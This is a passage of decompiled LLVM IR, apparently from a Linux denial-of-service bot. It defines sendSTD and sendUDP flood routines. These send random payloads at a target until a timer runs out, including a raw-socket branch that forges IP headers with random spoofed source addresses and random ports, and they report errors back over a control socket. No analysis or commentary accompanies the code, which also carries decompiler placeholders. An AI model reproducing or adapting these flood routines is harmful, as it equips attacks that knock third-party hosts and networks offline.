  uselistorder i32* %eax.global-to-local, { 198, 1, 0, 4, 2, 3, 6, 5, 9, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 22, 20, 21, 24, 23, 27, 25, 26, 29, 28, 30, 31, 32, 33, 36, 34, 35, 37, 38, 41, 39, 40, 44, 42, 43, 47, 45, 46, 49, 48, 50, 51, 54, 52, 55, 53, 56, 57, 58, 60, 59, 63, 61, 62, 64, 65, 66, 67, 68, 69, 71, 70, 74, 72, 73, 79, 76, 80, 77, 78, 81, 82, 75, 83, 84, 85, 88, 86, 89, 87, 90, 91, 92, 94, 93, 97, 95, 96, 98, 99, 100, 101, 102, 103, 105, 104, 108, 106, 107, 113, 110, 114, 111, 112, 115, 116, 109, 117, 118, 119, 121, 120, 124, 122, 123, 126, 125, 129, 127, 128, 130, 131, 132, 133, 134, 135, 137, 136, 138, 139, 140, 142, 141, 143, 144, 145, 146, 147, 150, 148, 149, 152, 151, 153, 154, 157, 155, 156, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 176, 191, 192, 193, 194, 195, 196, 197, 220, 199, 200, 213, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 221, 214, 215, 216, 217, 219, 218 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 513, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg1, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804e0dc, { 33, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 32, 0 }
  uselistorder label %dec_label_pc_804d15a, { 1, 0 }
  uselistorder label %dec_label_pc_804d10c, { 1, 0 }
  uselistorder label %dec_label_pc_804d100, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d0ef, { 2, 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e0f0 = load i32, i32* @ebp, align 4
  store i32 %v0_804e0f0, i32* %stack_var_-4, align 4
  %v4_804e0f0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804e0f0, i32* @ebp, align 4
  %v4_804e110 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804e11f = call i32 @__GI_time(i32* null)
  %v1_804e12d = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804e135 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_804e156 = add i32 %v1_804e12d, 12
  %v2_804e156 = inttoptr i32 %v1_804e156 to i32*
  %v3_804e156 = load i32, i32* %v2_804e156, align 4
  %v2_804e15e = ptrtoint i32* %stack_var_-36 to i32
  %v1_804e164 = add i32 %v1_804e12d, 16
  %v2_804e164 = inttoptr i32 %v1_804e164 to i32*
  %v3_804e164 = load i32, i32* %v2_804e164, align 4
  %v1_804e167 = inttoptr i32 %v3_804e164 to i32*
  %v2_804e167 = load i32, i32* %v1_804e167, align 4
  %v4_804e174 = call i32 @bcopy(i32 %v2_804e167, i32 %v2_804e15e, i32 %v3_804e156)
  %v1_804e17c = add i32 %v1_804e12d, 8
  %v2_804e17c = inttoptr i32 %v1_804e17c to i32*
  %v3_804e17c = load i32, i32* %v2_804e17c, align 4
  %v1_804e17f = urem i32 %v3_804e17c, 65536
  store i32 %v1_804e17f, i32* %stack_var_-40, align 4
  %v4_804e1b2 = bitcast i32* %stack_var_-184 to i16*
  %v5_804e25a = add i32 %v2_804e11f, %arg3
  br label %dec_label_pc_804e197

dec_label_pc_804e197:                             ; preds = %dec_label_pc_804e27f, %entry
  %storemerge = phi i32 [ %v4_804e27f, %dec_label_pc_804e27f ], [ 0, %entry ]
  %v5_804e1b2 = call i32 @memcpy(i16* %v4_804e1b2, i32 ptrtoint ([36 x i8*]* @global_var_8059540.302 to i32), i32 144)
  store i32 %v5_804e1b2, i32* @eax, align 4
  %v0_804e1b7 = call i32 @random()
  %tmp = icmp ult i32 %storemerge, 50
  br i1 %tmp, label %dec_label_pc_804e27f, label %dec_label_pc_804e20d

dec_label_pc_804e20d:                             ; preds = %dec_label_pc_804e197
  %v0_804e1fd = load i32, i32* @ebp, align 4
  %v3_804e1fd = add i32 %v0_804e1fd, -180
  %v2_804e1d2 = udiv i32 %v0_804e1b7, 36
  %tmp29 = mul nsw i32 %v2_804e1d2, -4
  %v2_804e1ef = add i32 %v0_804e1b7, %tmp29
  %v2_804e1fd = mul i32 %v2_804e1ef, 4
  %v4_804e1fd = add i32 %v3_804e1fd, %v2_804e1fd
  %v5_804e1fd = inttoptr i32 %v4_804e1fd to i32*
  %v6_804e1fd = load i32, i32* %v5_804e1fd, align 4
  %v5_804e22a = call i32 @__libc_send(i32 %v4_804e110, i32 %v6_804e1fd, i32 65, i32 0)
  %v4_804e244 = call i32 @__libc_connect(i32 %v4_804e110, i32 %v2_804e135, i32 16)
  %v2_804e250 = call i32 @__GI_time(i32* null)
  %v5_804e25f = icmp slt i32 %v2_804e250, %v5_804e25a
  br i1 %v5_804e25f, label %dec_label_pc_804e27f, label %dec_label_pc_804e261

dec_label_pc_804e261:                             ; preds = %dec_label_pc_804e20d
  %v1_804e267 = call i32 @__libc_close(i32 %v4_804e110)
  %v1_804e273 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e27f:                             ; preds = %dec_label_pc_804e20d, %dec_label_pc_804e197
  %stack_var_-12.0 = phi i32 [ %storemerge, %dec_label_pc_804e197 ], [ 0, %dec_label_pc_804e20d ]
  %v4_804e27f = add i32 %stack_var_-12.0, 1
  br label %dec_label_pc_804e197

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804e12d, { 1, 0, 2 }
  uselistorder i32 %v4_804e110, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 144, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i64 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_5()
  %tmp32 = call i16 @__decompiler_undefined_function_5()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %v0_804e28b = load i32, i32* @ebx, align 4
  %v13_804e28c = ptrtoint i32* %stack_var_-140 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804e295 = icmp eq i32 %arg2, 0
  %v1_804e299 = icmp eq i1 %v4_804e295, false
  br i1 %v1_804e299, label %dec_label_pc_804e2a9, label %dec_label_pc_804e29b

dec_label_pc_804e29b:                             ; preds = %entry
  %v1_804e29b = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804e2be

dec_label_pc_804e2a9:                             ; preds = %entry
  %v1_804e2ac = urem i32 %arg2, 65536
  store i32 %v1_804e2ac, i32* %eax.global-to-local, align 4
  store i32 %v1_804e2ac, i32* %stack_var_-140, align 4
  %v1_804e2b2 = trunc i32 %arg2 to i16
  %v2_804e2b2 = call i32 @htons(i16 %v1_804e2b2)
  br label %dec_label_pc_804e2be

dec_label_pc_804e2be:                             ; preds = %dec_label_pc_804e29b, %dec_label_pc_804e2a9
  %v2_804e2be = ptrtoint i32* %stack_var_-68 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-140, align 4
  %v4_804e2ce = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v4_804e2ce, i32* %eax.global-to-local, align 4
  %v1_804e2d3 = icmp eq i32 %v4_804e2ce, 0
  %v1_804e2d5 = icmp eq i1 %v1_804e2d3, false
  br i1 %v1_804e2d5, label %dec_label_pc_804e77c, label %dec_label_pc_804e2db

dec_label_pc_804e2db:                             ; preds = %dec_label_pc_804e2be
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804e2f4 = icmp eq i32 %arg4, 32
  %v1_804e2f8 = icmp eq i1 %v9_804e2f4, false
  br i1 %v1_804e2f8, label %dec_label_pc_804e434, label %dec_label_pc_804e2fe

dec_label_pc_804e2fe:                             ; preds = %dec_label_pc_804e2db
  store i32 2, i32* %stack_var_-140, align 4
  %v4_804e315 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_804e315, i32* %eax.global-to-local, align 4
  %v4_804e31d = icmp eq i32 %v4_804e315, 0
  %v1_804e321 = icmp eq i1 %v4_804e31d, false
  br i1 %v1_804e321, label %dec_label_pc_804e33d, label %dec_label_pc_804e323

dec_label_pc_804e323:                             ; preds = %dec_label_pc_804e2fe
  %v0_804e323 = load i32, i32* @global_var_805c520.20, align 32
  store i32 %v0_804e323, i32* %eax.global-to-local, align 4
  store i32 %v0_804e323, i32* %stack_var_-140, align 4
  %v3_804e333 = call i32 @sockprintf(i32 %v0_804e323, i32 ptrtoint ([27 x i8]* @global_var_80595d0.303 to i32))
  store i32 %v3_804e333, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e77c

dec_label_pc_804e33d:                             ; preds = %dec_label_pc_804e2fe
  %v1_804e340 = add i32 %arg5, 1
  store i32 %v1_804e340, i32* %eax.global-to-local, align 4
  store i32 %v1_804e340, i32* %stack_var_-140, align 4
  %v1_804e344 = call i32 @malloc(i32 %v1_804e340)
  store i32 %v1_804e344, i32* %eax.global-to-local, align 4
  %v4_804e34c = icmp eq i32 %v1_804e344, 0
  br i1 %v4_804e34c, label %dec_label_pc_804e77c, label %dec_label_pc_804e356

dec_label_pc_804e356:                             ; preds = %dec_label_pc_804e33d
  store i32 %v1_804e340, i32* %edx.global-to-local, align 4
  %v1_804e35f = inttoptr i32 %v1_804e344 to i8*
  store i32 %v1_804e344, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804e364 = and i32 %v1_804e344, -256
  store i32 %v1_804e364, i32* %eax.global-to-local, align 4
  %v5_804e366 = call i8* @_memset(i8* %v1_804e35f, i32 %v1_804e364, i32 %v1_804e340)
  store i32 %v1_804e344, i32* %eax.global-to-local, align 4
  store i32 %v1_804e344, i32* %stack_var_-140, align 4
  %v4_804e375 = call i32 @makeRandomStr(i8* %v1_804e35f, i32 %arg5)
  store i32 %v4_804e375, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804e381 = call i32 @__GI_time(i32* null)
  %v5_804e386 = add i32 %v2_804e381, %arg3
  store i32 %v5_804e386, i32* %eax.global-to-local, align 4
  %sext = mul i64 %arg8, 4294967296
  %v2_804e412 = sdiv i64 %sext, 4294967296
  %v3_804e412 = mul nsw i64 %v2_804e412, 1000
  %v4_804e412 = trunc i64 %v3_804e412 to i32
  br label %dec_label_pc_804e39c.outer

dec_label_pc_804e39c.outer:                       ; preds = %dec_label_pc_804e40f, %dec_label_pc_804e42c, %dec_label_pc_804e356
  %stack_var_-88.0.ph = phi i32 [ 0, %dec_label_pc_804e356 ], [ 0, %dec_label_pc_804e40f ], [ %v4_804e42c, %dec_label_pc_804e42c ]
  %stack_var_-92.0.ph = phi i32 [ 0, %dec_label_pc_804e356 ], [ %v4_804e404, %dec_label_pc_804e40f ], [ %v4_804e404, %dec_label_pc_804e42c ]
  br label %dec_label_pc_804e39c

dec_label_pc_804e39c:                             ; preds = %dec_label_pc_804e39c.outer, %dec_label_pc_804e3e6
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_804e3e6 ], [ %stack_var_-92.0.ph, %dec_label_pc_804e39c.outer ]
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v4_804e315, i32* %eax.global-to-local, align 4
  store i32 %v4_804e315, i32* %stack_var_-140, align 4
  %v7_804e3c7 = call i32 @__libc_sendto(i32 %v4_804e315, i32 %v1_804e344, i32 %arg5, i32 0, i32 %v2_804e2be, i32 16)
  store i32 %v7_804e3c7, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804e3cf = icmp eq i32 %stack_var_-92.0, %arg6
  %v1_804e3d2 = icmp eq i1 %v15_804e3cf, false
  br i1 %v1_804e3d2, label %dec_label_pc_804e404, label %dec_label_pc_804e3d4

dec_label_pc_804e3d4:                             ; preds = %dec_label_pc_804e39c
  br i1 %v1_804e299, label %dec_label_pc_804e3e6, label %dec_label_pc_804e3da

dec_label_pc_804e3da:                             ; preds = %dec_label_pc_804e3d4
  %v0_804e3da = load i32, i32* %stack_var_-140, align 4
  %v1_804e3da = call i32 @rand_cmwc(i32 %v0_804e3da)
  %v1_804e3df = urem i32 %v1_804e3da, 65536
  store i32 %v1_804e3df, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e3e6

dec_label_pc_804e3e6:                             ; preds = %dec_label_pc_804e3d4, %dec_label_pc_804e3da
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804e3ed = call i32 @__GI_time(i32* null)
  store i32 %v2_804e3ed, i32* %eax.global-to-local, align 4
  %v8_804e3f5 = icmp sgt i32 %v2_804e3ed, %v5_804e386
  br i1 %v8_804e3f5, label %dec_label_pc_804e77c, label %dec_label_pc_804e39c

dec_label_pc_804e404:                             ; preds = %dec_label_pc_804e39c
  %v4_804e404 = add i32 %stack_var_-92.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804e40a = icmp eq i32 %stack_var_-88.0.ph, %arg7
  %v1_804e40d = icmp eq i1 %v15_804e40a, false
  br i1 %v1_804e40d, label %dec_label_pc_804e42c, label %dec_label_pc_804e40f

dec_label_pc_804e40f:                             ; preds = %dec_label_pc_804e404
  store i32 %v4_804e412, i32* %eax.global-to-local, align 4
  store i32 %v4_804e412, i32* %stack_var_-140, align 4
  %v2_804e41b = call i32 @usleep(i64 %v3_804e412)
  store i32 %v2_804e41b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e39c.outer

dec_label_pc_804e42c:                             ; preds = %dec_label_pc_804e404
  %v4_804e42c = add i32 %stack_var_-88.0.ph, 1
  br label %dec_label_pc_804e39c.outer

dec_label_pc_804e434:                             ; preds = %dec_label_pc_804e2db
  store i32 %v13_804e28c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-140, align 4
  %v4_804e450 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v4_804e450, i32* %eax.global-to-local, align 4
  %v4_804e458 = icmp eq i32 %v4_804e450, 0
  %v1_804e45c = icmp eq i1 %v4_804e458, false
  br i1 %v1_804e45c, label %dec_label_pc_804e478, label %dec_label_pc_804e45e

dec_label_pc_804e45e:                             ; preds = %dec_label_pc_804e434
  %v0_804e45e = load i32, i32* @global_var_805c520.20, align 32
  store i32 %v0_804e45e, i32* %eax.global-to-local, align 4
  store i32 %v0_804e45e, i32* %stack_var_-140, align 4
  %v3_804e46e = call i32 @sockprintf(i32 %v0_804e45e, i32 ptrtoint ([27 x i8]* @global_var_80595d0.303 to i32))
  store i32 %v3_804e46e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e779

dec_label_pc_804e478:                             ; preds = %dec_label_pc_804e434
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804e487 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v4_804e450, i32* %eax.global-to-local, align 4
  store i32 %v4_804e450, i32* %stack_var_-140, align 4
  %v6_804e4a4 = call i32 @__GI_setsockopt(i32 %v4_804e450, i32 0, i32 3, i32 %v2_804e487, i32 4)
  store i32 %v6_804e4a4, i32* %eax.global-to-local, align 4
  %v2_804e4a9 = icmp slt i32 %v6_804e4a4, 0
  %v1_804e4ab = icmp eq i1 %v2_804e4a9, false
  br i1 %v1_804e4ab, label %dec_label_pc_804e4fa.preheader, label %dec_label_pc_804e4ad

dec_label_pc_804e4fa.preheader:                   ; preds = %dec_label_pc_804e478
  br label %dec_label_pc_804e4d0

dec_label_pc_804e4ad:                             ; preds = %dec_label_pc_804e478
  %v0_804e4ad = load i32, i32* @global_var_805c520.20, align 32
  store i32 %v0_804e4ad, i32* %eax.global-to-local, align 4
  store i32 %v0_804e4ad, i32* %stack_var_-140, align 4
  %v3_804e4bd = call i32 @sockprintf(i32 %v0_804e4ad, i32 ptrtoint ([33 x i8]* @global_var_80595ec.304 to i32))
  store i32 %v3_804e4bd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e779

dec_label_pc_804e4d0:                             ; preds = %dec_label_pc_804e4fa.preheader, %dec_label_pc_804e4d0
  %v4_804e4fa76 = phi i32 [ 49, %dec_label_pc_804e4fa.preheader ], [ %v4_804e4fa, %dec_label_pc_804e4d0 ]
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804e4d7 = call i32 @__GI_time(i32* null)
  store i32 %v2_804e4d7, i32* %eax.global-to-local, align 4
  store i32 %v2_804e4d7, i32* @ebx, align 4
  %v0_804e4de = load i32, i32* %stack_var_-140, align 4
  %v1_804e4de = call i32 @rand_cmwc(i32 %v0_804e4de)
  %v1_804e4e3 = load i32, i32* @ebx, align 4
  %v2_804e4e3 = xor i32 %v1_804e4e3, %v1_804e4de
  store i32 %v2_804e4e3, i32* @eax, align 4
  store i32 %v2_804e4e3, i32* %stack_var_-140, align 4
  %v1_804e4e8 = call i32 @srand(i32 %v2_804e4e3)
  store i32 %v1_804e4e8, i32* @eax, align 4
  %v0_804e4ed = call i32 @random()
  store i32 %v0_804e4ed, i32* %eax.global-to-local, align 4
  store i32 %v0_804e4ed, i32* %stack_var_-140, align 4
  %v1_804e4f5 = call i32 @init_rand(i32 %v0_804e4ed)
  store i32 %v1_804e4f5, i32* %eax.global-to-local, align 4
  %v4_804e4fa = add nsw i32 %v4_804e4fa76, -1
  %v13_804e4fd = icmp eq i32 %v4_804e4fa76, 0
  %v1_804e501 = icmp eq i1 %v13_804e4fd, false
  br i1 %v1_804e501, label %dec_label_pc_804e4d0, label %dec_label_pc_804e503

dec_label_pc_804e503:                             ; preds = %dec_label_pc_804e4d0
  %v4_804e503 = icmp eq i32 %arg4, 0
  %v1_804e507 = icmp eq i1 %v4_804e503, false
  br i1 %v1_804e507, label %dec_label_pc_804e512, label %dec_label_pc_804e528

dec_label_pc_804e512:                             ; preds = %dec_label_pc_804e503
  %v5_804e519 = sub i32 32, %arg4
  %v2_804e521 = urem i32 %v5_804e519, 32
  %v4_804e521 = icmp eq i32 %v2_804e521, 0
  br i1 %v4_804e521, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_804e512
  %v5_804e521 = shl i32 1, %v2_804e521
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_804e512, %bb
  %v0_804e523 = phi i32 [ %v5_804e521, %bb ], [ 1, %dec_label_pc_804e512 ]
  %v1_804e523 = sub i32 0, %v0_804e523
  store i32 %v1_804e523, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e528

dec_label_pc_804e528:                             ; preds = %dec_label_pc_804e503, %bb72
  %storemerge6 = phi i32 [ %v1_804e523, %bb72 ], [ 0, %dec_label_pc_804e503 ]
  %v1_804e52b = add i32 %arg5, 28
  %v1_804e537 = add i32 %arg5, 58
  %v2_804e53a = and i32 %v1_804e537, -16
  %v0_804e540 = load i32, i32* @esp, align 4
  %v2_804e540 = sub i32 %v0_804e540, %v2_804e53a
  %v1_804e54c = add i32 %v2_804e540, 39
  %v2_804e54f = and i32 %v1_804e54c, -16
  store i32 %v2_804e54f, i32* %edx.global-to-local, align 4
  %v1_804e567 = add i32 %v2_804e54f, 20
  %v5_804e56a = inttoptr i32 %v1_804e567 to i16*
  %v1_804e570 = add i32 %arg5, 8
  store i32 %v1_804e570, i32* @ebx, align 4
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804e578 = inttoptr i32 %v2_804e540 to i32*
  store i32 %storemerge6, i32* %v2_804e578, align 4
  %v2_804e57b = call i32 @GetRandomIP(i32 %v1_804e52b, i32 %v2_804e54f)
  store i32 %v2_804e57b, i32* %eax.global-to-local, align 4
  %v1_804e580 = load i32, i32* @esp, align 4
  %v2_804e580 = inttoptr i32 %v1_804e580 to i32*
  store i32 %v2_804e57b, i32* %v2_804e580, align 4
  %v0_804e583 = call i32 @htonl()
  %v3_804e588 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804e588, i32* %edx.global-to-local, align 4
  %v0_804e58b = load i32, i32* @ebx, align 4
  %v1_804e58b = load i32, i32* @esp, align 4
  %v2_804e58b = add i32 %v1_804e58b, 16
  %v3_804e58b = inttoptr i32 %v2_804e58b to i32*
  store i32 %v0_804e58b, i32* %v3_804e58b, align 4
  %v0_804e58f = load i32, i32* @esp, align 4
  %v1_804e58f = add i32 %v0_804e58f, 12
  %v2_804e58f = inttoptr i32 %v1_804e58f to i32*
  store i32 17, i32* %v2_804e58f, align 4
  %v1_804e597 = load i32, i32* @esp, align 4
  %v2_804e597 = add i32 %v1_804e597, 8
  %v3_804e597 = inttoptr i32 %v2_804e597 to i32*
  store i32 %v0_804e583, i32* %v3_804e597, align 4
  %v0_804e59b = load i32, i32* %edx.global-to-local, align 4
  %v1_804e59b = load i32, i32* @esp, align 4
  %v2_804e59b = add i32 %v1_804e59b, 4
  %v3_804e59b = inttoptr i32 %v2_804e59b to i32*
  store i32 %v0_804e59b, i32* %v3_804e59b, align 4
  store i32 %v2_804e54f, i32* %eax.global-to-local, align 4
  %v1_804e5a2 = load i32, i32* @esp, align 4
  %v2_804e5a2 = inttoptr i32 %v1_804e5a2 to i32*
  store i32 %v2_804e54f, i32* %v2_804e5a2, align 4
  %v0_804e5a5 = call i32 @makeIPPacket()
  %v1_804e5b3 = urem i32 %v1_804e570, 65536
  store i32 %v1_804e5b3, i32* %eax.global-to-local, align 4
  %v1_804e5b6 = load i32, i32* @esp, align 4
  %v2_804e5b6 = inttoptr i32 %v1_804e5b6 to i32*
  store i32 %v1_804e5b3, i32* %v2_804e5b6, align 4
  %v2_804e5b9 = trunc i32 %v1_804e567 to i16
  %v3_804e5b9 = call i32 @htons(i16 %v2_804e5b9)
  %v1_804e5be = urem i32 %v3_804e5b9, 65536
  store i32 %v1_804e5be, i32* %edx.global-to-local, align 4
  store i32 %v1_804e567, i32* %eax.global-to-local, align 4
  %v1_804e5c4 = trunc i32 %v3_804e5b9 to i16
  %v3_804e5c4 = add i32 %v2_804e54f, 24
  %v4_804e5c4 = inttoptr i32 %v3_804e5c4 to i16*
  store i16 %v1_804e5c4, i16* %v4_804e5c4, align 8
  %v2_804e5c8 = call i32 @rand_cmwc(i32 %v1_804e567)
  %v1_804e5cd = urem i32 %v2_804e5c8, 65536
  store i32 %v1_804e5cd, i32* %edx.global-to-local, align 4
  store i32 %v1_804e567, i32* %eax.global-to-local, align 4
  %v1_804e5d3 = trunc i32 %v2_804e5c8 to i16
  store i16 %v1_804e5d3, i16* %v5_804e56a, align 4
  br i1 %v1_804e299, label %dec_label_pc_804e5e9, label %dec_label_pc_804e5dc

dec_label_pc_804e5dc:                             ; preds = %dec_label_pc_804e528
  %v2_804e5dc = call i32 @rand_cmwc(i32 %v1_804e567)
  %.pre = urem i32 %arg2, 65536
  br label %dec_label_pc_804e5fd

dec_label_pc_804e5e9:                             ; preds = %dec_label_pc_804e528
  %v1_804e5ec = urem i32 %arg2, 65536
  store i32 %v1_804e5ec, i32* %eax.global-to-local, align 4
  %v1_804e5ef = load i32, i32* @esp, align 4
  %v2_804e5ef = inttoptr i32 %v1_804e5ef to i32*
  store i32 %v1_804e5ec, i32* %v2_804e5ef, align 4
  %v3_804e5f2 = call i32 @htons(i16 %tmp32)
  br label %dec_label_pc_804e5fd

dec_label_pc_804e5fd:                             ; preds = %dec_label_pc_804e5dc, %dec_label_pc_804e5e9
  %v1_804e6bd.pre-phi = phi i32 [ %.pre, %dec_label_pc_804e5dc ], [ %v1_804e5ec, %dec_label_pc_804e5e9 ]
  %storemerge8.in = phi i32 [ %v2_804e5dc, %dec_label_pc_804e5dc ], [ %v3_804e5f2, %dec_label_pc_804e5e9 ]
  %storemerge5 = trunc i32 %storemerge8.in to i16
  %sext9 = mul i32 %storemerge8.in, 65536
  %v4_804e600 = sdiv i32 %sext9, 65536
  %v3_804e603 = add i32 %v2_804e54f, 22
  %v4_804e603 = inttoptr i32 %v3_804e603 to i16*
  store i16 %storemerge5, i16* %v4_804e603, align 2
  %v1_804e60a = add i32 %v2_804e54f, 26
  %v2_804e60a = inttoptr i32 %v1_804e60a to i16*
  store i16 0, i16* %v2_804e60a, align 2
  %v1_804e613 = add i32 %v2_804e54f, 28
  store i32 %v1_804e613, i32* %edx.global-to-local, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  %v1_804e619 = load i32, i32* @esp, align 4
  %v2_804e619 = add i32 %v1_804e619, 4
  %v3_804e619 = inttoptr i32 %v2_804e619 to i32*
  store i32 %arg5, i32* %v3_804e619, align 4
  %v0_804e61d = load i32, i32* %edx.global-to-local, align 4
  %v1_804e61d = load i32, i32* @esp, align 4
  %v2_804e61d = inttoptr i32 %v1_804e61d to i32*
  store i32 %v0_804e61d, i32* %v2_804e61d, align 4
  %v3_804e620 = sext i16 %tmp to i32
  %v4_804e620 = inttoptr i32 %v4_804e600 to i8*
  %v5_804e620 = call i32 @makeRandomStr(i8* %v4_804e620, i32 %v3_804e620)
  store i32 %v2_804e54f, i32* %eax.global-to-local, align 4
  %v1_804e628 = or i32 %v2_804e54f, 2
  %v2_804e628 = inttoptr i32 %v1_804e628 to i16*
  %v3_804e628 = load i16, i16* %v2_804e628, align 2
  %v4_804e628 = zext i16 %v3_804e628 to i32
  store i32 %v4_804e628, i32* %edx.global-to-local, align 4
  store i32 %v2_804e54f, i32* %eax.global-to-local, align 4
  %v1_804e631 = load i32, i32* @esp, align 4
  %v2_804e631 = add i32 %v1_804e631, 4
  %v3_804e631 = inttoptr i32 %v2_804e631 to i32*
  store i32 %v4_804e628, i32* %v3_804e631, align 4
  %v0_804e635 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e635 = load i32, i32* @esp, align 4
  %v2_804e635 = inttoptr i32 %v1_804e635 to i32*
  store i32 %v0_804e635, i32* %v2_804e635, align 4
  %v4_804e638 = inttoptr i32 %v4_804e600 to i16*
  %v5_804e638 = call i32 @csum(i16* %v4_804e638, i32 %v3_804e620)
  %v1_804e63d = urem i32 %v5_804e638, 65536
  store i32 %v1_804e63d, i32* %edx.global-to-local, align 4
  store i32 %v2_804e54f, i32* %eax.global-to-local, align 4
  %v1_804e643 = trunc i32 %v5_804e638 to i16
  %v3_804e643 = or i32 %v2_804e54f, 10
  %v4_804e643 = inttoptr i32 %v3_804e643 to i16*
  store i16 %v1_804e643, i16* %v4_804e643, align 2
  %v0_804e647 = load i32, i32* @esp, align 4
  %v1_804e647 = inttoptr i32 %v0_804e647 to i32*
  store i32 0, i32* %v1_804e647, align 4
  %v2_804e64e = inttoptr i32 %v4_804e600 to i32*
  %v3_804e64e = call i32 @__GI_time(i32* %v2_804e64e)
  %v5_804e653 = add i32 %v3_804e64e, %arg3
  store i32 %v5_804e653, i32* %eax.global-to-local, align 4
  %v3_804e6e3 = or i32 %v2_804e54f, 4
  %v4_804e6e3 = inttoptr i32 %v3_804e6e3 to i16*
  %v2_804e6ff = or i32 %v2_804e54f, 12
  %v3_804e6ff = inttoptr i32 %v2_804e6ff to i32*
  %sext12 = mul i64 %arg8, 4294967296
  %v2_804e757 = sdiv i64 %sext12, 4294967296
  %v3_804e757 = mul nsw i64 %v2_804e757, 1000
  %v4_804e757 = trunc i64 %v3_804e757 to i32
  br label %dec_label_pc_804e669.outer

dec_label_pc_804e669.outer:                       ; preds = %dec_label_pc_804e754, %dec_label_pc_804e771, %dec_label_pc_804e5fd
  %stack_var_-84.0.ph = phi i32 [ 0, %dec_label_pc_804e5fd ], [ %v4_804e749, %dec_label_pc_804e771 ], [ %v4_804e749, %dec_label_pc_804e754 ]
  %stack_var_-80.0.ph = phi i32 [ 0, %dec_label_pc_804e5fd ], [ %v4_804e771, %dec_label_pc_804e771 ], [ 0, %dec_label_pc_804e754 ]
  %stack_var_-104.0.ph = phi i16 [ %tmp, %dec_label_pc_804e5fd ], [ %storemerge, %dec_label_pc_804e771 ], [ %storemerge, %dec_label_pc_804e754 ]
  br label %dec_label_pc_804e669

dec_label_pc_804e669:                             ; preds = %dec_label_pc_804e669.outer, %dec_label_pc_804e72c
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804e72c ], [ %stack_var_-84.0.ph, %dec_label_pc_804e669.outer ]
